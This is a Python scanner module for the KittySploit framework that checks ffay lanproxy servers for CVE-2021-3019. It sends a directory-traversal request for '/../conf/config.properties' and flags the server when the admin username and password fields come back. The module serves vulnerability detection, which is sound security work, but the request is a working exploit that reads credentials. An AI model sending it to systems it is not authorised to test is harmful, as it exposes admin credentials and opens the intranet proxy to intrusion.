#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ffay lanproxy 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ffay lanproxy Directory Traversal Detection',
        'description': 'ffay lanproxy 0.1 is susceptible to a directory traversal vulnerability that could let attackers read /../conf/config.properties to obtain credentials for a connection to the intranet.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lanproxy', 'lfi', 'lanproxy_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/ffay/lanproxy/commits/master',
            'https://github.com/maybe-why-not/lanproxy/issues/1',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-3019',
            'https://github.com/manas3c/CVE-POC',
        ],
        'cve': 'CVE-2021-3019',
    }

    def run(self):
        r = self.http_request(method="GET", path='/../conf/config.properties', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('config.admin.username', 'config.admin.password',)
        header_all = ('application/octet-stream',)
        if (all(m in body for m in body_all)) and (all(m in headers for m in header_all)):
            self.set_info(
                severity='high',
                reason="ffay lanproxy Directory Traversal detected",
                path='/../conf/config.properties',
            )
            return True
        return False

